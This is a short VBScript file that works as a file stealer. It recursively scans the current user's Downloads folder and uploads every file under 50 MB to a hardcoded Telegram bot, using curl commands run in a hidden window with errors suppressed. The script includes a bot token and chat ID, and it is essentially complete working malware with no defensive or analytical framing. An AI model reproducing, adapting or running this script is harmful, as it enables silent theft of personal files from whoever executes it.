Option Explicit

Dim objFSO, objShell, strDownloadsPath, strToken, strChatID
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

strToken = "8753197849:AAEt6hYg0iAvJXqdPN-OcuQJvhfhs7kMbmA"
strChatID = "6086173881"


strDownloadsPath = objShell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads")

If objFSO.FolderExists(strDownloadsPath) Then
    ProcessFiles objFSO.GetFolder(strDownloadsPath)
End If

Sub ProcessFiles(objFolder)
    Dim objFile, objSubFolder
    On Error Resume Next
    
    For Each objFile In objFolder.Files
        If objFile.Size < 52428800 Then 
            SendToTelegram objFile.Path, objFile.Name
            WScript.Sleep 2000 
        End If
    Next
    
    For Each objSubFolder In objFolder.SubFolders
        ProcessFiles objSubFolder
    Next
End Sub

Sub SendToTelegram(strFilePath, strFileName)
    Dim strCommand
    strCommand = "cmd /c curl -s -X POST ""https://api.telegram.org/bot" & strToken & "/sendDocument"" " & _
                 "-F chat_id=""" & strChatID & """ " & _
                 "-F caption=""File: " & strFileName & vbCrLf & "Path: " & strFilePath & """ " & _
                 "-F document=@""" & strFilePath & """"
    
    objShell.Run strCommand, 0, True
End Sub